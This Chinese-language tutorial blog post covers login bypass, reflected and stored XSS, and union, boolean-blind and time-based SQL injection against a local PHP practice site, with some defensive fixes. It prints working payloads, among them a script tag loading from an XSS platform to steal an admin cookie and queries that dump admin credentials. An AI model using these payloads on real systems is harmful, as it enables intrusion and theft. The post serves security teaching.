---
title:2021-03-18-常见漏洞分析 
tags: 代码审计,PHP,漏洞
renderNumberedHeading: true
grammar_cjkRuby: true
---

## 常见漏洞分析

> 万能密码漏洞分析<br>
> XSS漏洞分析<br>
> SQL注入漏洞分析<br>


### 万能密码漏洞

> 万能密码就是绕过登录验证直接进入管理员后台的密码，这种类型的密码可以通用到很多存在此漏洞的网站所以称之为万能。

我们先来了解一下 MySQL 的几种注释方式
>  单行注释  #<br>
>  单行注释  -- （注意一下这个后面要跟一个空格 --"空格"）<br>
>  多行注释  /**/<br>

`#` 号注释：
`select admin_username from admin where admin_id=1; #这是注释;`<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614683080590.png)

`- -` 注释：
不加空格会报错`select admin_username from admin where admin_id=1; --这是注释;`<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614683333159.png)

正确写法`select admin_username from admin where admin_id=1; -- 这是注释;`<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614683596713.png)

`/**/` 多行注释：<br>
`select admin_username from admin where admin_id=1;/*多行注释*/;`
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614683800141.png)

接下来我们来尝试构造利用一下<br>
登陆界面先抓包看一下提交地址和 POST 参数<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614684146627.png)

提交地址：`http://www.vul.com/checkUser.php`<br>
POST 参数：`user_name=test&user_pass=test1`<br>

我们使用 Hackbar 来重新构造提交数据<br>
这里把 user_name 的值更改为我们构造的语句 `test' or 1=1 #;`<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614685331639.png)

来提交一下，看是否能登陆成功<br>
成功登陆账号为 123 的用户<br> 
![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614685497914.png)

接下来我们查看一下源代码，看他执行的是什么样子的 SQL 语句<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614685812094.png)

```php?linenums
if(isset($_POST["user_name"]) && isset($_POST["user_pass"])){
        $usename = trim($_POST["user_name"]);
        $password = trim($_POST["user_pass"]);
        $password = md5($password);
        $sql = "select * from users where user_name='$usename' and user_pass='$password'";

        $selectSQL = new MySql();
        $user_data = $selectSQL->getRow($sql);
```
先进行判断是否传入了 user_name 和 user_pass 

`if(isset($_POST["user_name"]) && isset($_POST["user_pass"]))`

然后对 user_name 和 user_pass 进行赋值
```
$usename = trim($_POST["user_name"]);
$password = trim($_POST["user_pass"]);
```
我们可以看到这里没有对 user_name 和 user_pass 的值做任何过滤

`trim` 只是过滤首尾处空格的一个函数

对字符串进行md5加密
`$password = md5($password)` `md5() 函数` 

然后就直接带入了查询
`$sql = "select * from users where user_name='$usename' and user_pass='$password'"`

这里我们可以把 SQL 语句来进行输出查看他执行的 SQL 语句<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614686740791.png)

然后我们再来提交一下刚刚提交的 POST 数据<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614686972852.png)

可以看到执行的 SQL 语句为
`select * from users where user_name='test' or 1=1 #;' and user_pass='5a105e8b9d40e1329780d62ea2265d8a'`

我们在命令行来执行一下，查看它的返回结果<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614687087613.png)

可以看到返回结果为多行数据，我们成功登陆的也是第一条数据的用户

我们接下来跟一下输出查询结果的方法<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614687941826.png)

定位到文件 `lib\mysql.class.php` 73行代码处<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614688006916.png)

```php?linenums
public function getRow($sql){
        $res = $this->link->query($sql);
        $row = $res->fetch_assoc();
        return $row;
    }
```

定义一个  `getRow` 的函数方法 `public function getRow($sql)`

连接数据库  `$res = $this->link->query($sql)`

`fetch_assoc` 从查询结果中取一行作为关联数组，然后 `return` 出来
```
$row = $res->fetch_assoc();
        return $row;
```

这也就是说为什么会登陆第一行数据的用户。

**防御方法：**

我们可以使用下面两个函数来进行过滤：
>`addslashes ` 用反斜线转义字符串中的字符
>
>`mysql_real_escape_string`  转义 SQL 语句中使用的字符串中的特殊字符<br>

![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614691974313.png)

查看一下过滤效果

可以看到这里直接用 \ 来转义单引号<br>
![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614692020354.png)

我们也就登陆不成功了<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614692205522.png)

### XSS漏洞

> XSS漏洞分为：<br>
> 反射型XSS<br>
> 储存型XSS<br>
> DOM型XSS

#### 反射型XSS：
>反射型XSS是一次性的，仅对当次的页面访问产生影响。反射型XSS攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。

反射型XSS一般出现在搜索框处，我们打开靶场来进行测试

我们随便搜索一个字符<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614701187583.png)

可以看到链接是为 GET 型传参 `search.php?search=t`，t 为我们搜索的内容，直接显示到了页面

我们尝试一下 XSS 弹窗代码 `<script>alert(/xss-test/)</script>`<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614701334415.png)

查看一下源码，看它是怎么进行传参<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614701792648.png)

```php?linenums
if(isset($_GET["search"])){
        $search  = trim($_GET["search"]);
        $sql_comment = "select * from comment where text like '%$search%' order by comment_id";
```

判断  search 参数是否接受到数据 `if(isset($_GET["search"]))`

赋值到变量 search 并去除一下空格，可以看到也没有进行任何过滤操作
`$search  = trim($_GET["search"])` 

然后进行数据库查询
`$sql_comment = "select * from comment where text like '%$search%' order by comment_id";`

在 `search.html` 文件中可以看到，搜索的内容会被输出出来，也没有进行过滤<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614702805425.png)


#### 储存型XSS

> 储存型XSS会把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。

储存型 XSS 一般都是用来打管理员的 Cookie，接下来我们来操作一下<br>
先登录一下，找到留言板提交一个新的留言<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614703539830.png)


XSS代码：`<script src=http://www.xss.com/57qTTP?1614703514></script>` <br>
其中 `http://www.xss.com/57qTTP?1614703514` 为XSS平台，这个XSS平台是我本地搭建的

留言成功之后我们使用管理员账号来登陆查看一下这个留言内容<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614703813817.png)

然后再XSS平台查看是否成功接收到 Cookie 信息<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614703865060.png)

可以看到成功得到管理员的 Cookie 信息

接下来我们来进行尝试 Cookie 欺骗登陆

使用火狐插件 firebug 来修改添加 Cookie 信息，把时间设置一个小时<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614704058397.png)

一共添加两处 Cookie 信息<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614704161927.png)

然后我们访问路径XSS接收到的后台路径 `admin/comment_edit.php`<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614704290169.png)

直接可以登录到管理后台，不需要账号密码。

**防御方法：**
我们可以使用以下两个函数：<br>
> `htmlspecialchars`  将特殊字符转换为 HTML 实体<br>
> `htmlentities` 将字符转换为 HTML 转义字符（会转换所有具有 HTML 实体的字符。）

以反射型 XSS 为例

我们可以在输出的地方来进行转义，也可以在传参的地方进行转义<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614704590174.png)

在搜索处在执行一下弹窗的 XSS 代码<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614704664034.png)

可以看到 `<>` 都被转换为了 HTML 实体字符。

### SQL注入

> SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。

介绍以下接种注入方式：<br>
> 联合注入<br>
> 布尔注入<br>
> 延时注入

#### 联合注入

先来看一下我们联合注入经常使用到的 `order by` 语句

> `order by` 是用来基于一个或多个列按升序或降序顺序排列数据

查询一下 `student` 表中的数据  `select * from student;` <br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614779381631.png)

使用 order by 语句来进行倒序排列 id `select * from student order by id desc;`<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614779581733.png)

在 SQL 注入中经常用 `order by` 语句来判断字段长度

可以看到 `student` 这张表的字段分别为 `id、name、age、classId` 四个字段

直接使用 `order by 1,2,3,4` ，如果使用 `order by 1,2,3,4,5`可以看一下它的报错<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614779966536.png)

判断出四列之后，我们使用 `union select 1,2,3,4` 来进行进一步操作<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614780117643.png)

可以看到 1,2,3,4 被插入到了最后一行，然后我们进行替换，来进一步得到我们想要的信息<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614780290634.png)

得到了用户权限和当前使用的数据库名称

Mysql 常用的一些函数：
> system_user()	系统用户名<br>
> user()			用户名<br>
> current_user 		当前用户<br>
> session_user()	连接数据库的用户名<br>
> database()		数据库名<br>
> version()			Mysql数据库版本<br>
> load_file()		转成16进制或者10进制Mysql读取本地文件函数<br>
> @@datadir		读取数据库路径<br>
> @@basedir		Mysql安装路径<br>
> @@version_compile_os 	操作系统

接下来还是用留言板那个靶场来进行操作一下，在搜索处

修改一下靶场，让它把查询语句输出出来<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614780984245.png)

分析一下它的查询语句 `select * from comment where text like '%t%' order by comment_id`<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614781568332.png)

需要闭合一下前面的内容更改 SQL 语句为

`select * from comment where text like '%t%' order by 1 #%' order by comment_id`<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614781428875.png)

这里需要注意把 `#` URL编码一下

尝试一下 `order by 4`<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614782317797.png)

返回正常

然后尝试一下 `order by 5`<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614782361478.png)

返回错误

这样我们就可以判断出字段数为四个

接下来使用 `union select` 来进行查询当前使用的数据库<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614782612440.png)

知道数据名称之后，我们来查询表
`-t%'union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=0x76756C5F73716C%23`

这里数据库名称使用工具转成 HEX 编码<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614783954500.png)

查询出来有三张表，分别为 `admin、comment、users`
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614784016018.png)

我们的目的是查询出管理员的用户名密码，所以直接对 `admin` 表进行查询

接下来就是查询字段
`-t%'union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name=0x61646D696E%23`<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614784189569.png)

字段为 `admin_id、admin_username、admin_password`

查询出 `admin_username、admin_password` 字段的内容

`-t%'union select 1,2,group_concat(admin_username,0x7E,admin_password),4 from admin %23`<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614784348806.png)

得到管理账号密码 `admin~21232f297a57a5a743894a0e4a801fc3`

#### 布尔注入

先了解一下 Mysql 下的三个函数<br>
> 字符串截取   mid(str,1,1)<br>
> 转换ASCII码 ord()   <br>
> 统计字符串长度 length()

`mid()` 第一个参数为字符串，第二个参数为起始字符，第三个参数截取长度<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614785045181.png)

`ord()` 转换ASCII码<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614785137342.png)

`length()` 统计字符串长度<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614785201375.png)

通常在进行布尔注入时，经常使用 `and` 或者 `or` 来进行判断

还是拿留言板搜索处为例

先来判断一下数据库的长度是否大于5 `t%' and (select length(database()))>5 %23` <br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614916473343.png)

以此去判断，最后确定数据库长度为7<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614916838046.png)

然后来逐个查询出数据库的各个字符 `t%' and (select(ord(mid(database(),1,1))=118)) %23`

> 查询数据库第一个字符：`mid(databse(),1,1)`
> 把查询出来的字符转换成ASCII码进行比对：`ord()`
> 进行 `select` 查询<br>

![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614927694440.png)

ASIIC码表：<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614929810953.png)

接下来就使用Burp来进行爆破一下数据库的7个字符

Burp抓包 > 右键 > 发送到 Intruder 模块<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614930530944.png)

然后选择 `Cluster bomb` 方法去爆破，设置一下需要爆破的地方<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614931872624.png)

第一个 `payload` 设置，从第一步就判断出数据库字符长度 7 ，所以这里也设置 7<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614931996446.png)

第二个 `payload` 设置，ASIIC码一共有127个，所以这里设置成127<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614932025501.png)

然后点击 `Start attack` ，爆破完成之后点击 `Length` 进行排序<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614932238539.png)

我们把爆破结果摘选出来
> 1 > 118--v<br>
> 2 > 117--u<br>
> 3 > 108--l<br>
> 4 > 95  --_<br>
> 5 > 115--s<br>
> 6 > 113--q<br>
> 7 > 108--l<br>
> database_name：vul_sql

得到数据库之后，接下来进行表的猜解

跟数据库操作差不多，先判断表的个数 `t%' and (select count(table_name) from information_schema.tables where table_schema='vul_sql')=3 %23`<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614934470673.png)

判断出表个数为 3 个，然后对每个表进行爆破猜解，步骤跟猜解数据库的时候差不多

猜解第一个表的长度 `t%' and (select length(concat(table_name)) from information_schema.tables where table_schema='vul_sql' limit 0,1)=5 %23` ，长度为5<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614935559085.png)

逐个猜解5个字符 `t%' and ord(mid((select concat(table_name) from information_schema.tables where table_schema='vul_sql' limit 0,1),1,1))=97 %23`<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614936113929.png)

还是利用 burp 来进行爆破猜解<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1614936197394.png)

把爆破结果摘选出来：
> 1 > 97--a<br>
> 2 > 100--d<br>
> 3 > 109--m<br>
> 4 > 105--i<br>
> 5 > 110--n<br>
> 第一个表名为：admin

猜解字段数：`t%' and (select count(column_name)  from information_schema.columns where table_name='admin')=3 %23`<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1615366172547.png)

字段数为：3

逐个对三个字段进行猜解爆破

判断第一个字段长度 `t%' and (select length(concat(column_name))  from information_schema.columns where table_name='admin' limit 0,1)=8%23` <br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1615367089407.png)

第一个字段长度为 8 ，然后使用 Burp 进行爆破相对应的字符<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1615367399500.png)

> 1 > 97 --a<br>
> 2 > 100 --d<br>
> 3 > 109 --m<br>
> 4 > 105 --i<br>
> 5 > 110 --n<br>
> 6 > 95 --_<br>
> 7 > 105 --i<br>
> 8 > 100 --d<br>
> 第一个字段为：admin_id

接下来就是猜解剩余的 2 个字段，方法和上面一样

猜解出来的三个字段分别为：`admin_id，admin_username，admin_password`

对字段内容进行猜解，先判断字段内容长度
`t%' and (select length(concat(admin_username,0x5e,admin_password)) from admin)=38 %23`<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1615368535869.png)

内容长度为 38 个，使用 Burp 对这 38 个字符进行逐个猜解<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1615368709322.png)
<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1615368795739.png)

内容为：<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1615368875977.png)

得到管理账号密码 `admin^21232f297a57a5a743894a0e4a801fc3`

#### 延时注入
> 盲注的核心是靠 if 判断来注入<br>
>  了解一下 MySQL 中 if()  和 sleep() 函数的用法<br>
>  if(条件,True,False)<br>
>  sleep(n)

`select if (3<5,1,0) `，3<5 为判断条件

如果3<5就返回1<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1616066989554.png)

相反则返回0<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1616067019368.png)

`sleep(5)`，睡眠5秒后执行<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1616067734561.png)

使用 Burp 来测试延时注入，使用`t%' and if(1=1,sleep(3),2) #` 来判断是否存在注入

> if(1=1,sleep(3),2)，如果1=1，那么就睡眠3秒后执行，如果不就直接返回<br>

![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1616073562166.png)

后面的注入跟布尔注入有点相似了

判断一下数据库的长度 `t%' and if((select length(database()))=7,sleep(3),2) %23`<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1616074044273.png)

接下来猜解数据库的名称 `t%' and if((select ord(mid(database(),1,1)=118)),sleep(3),1) %23`<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1616074872747.png)

后面参照布尔注入的语句来尝试下面的猜解


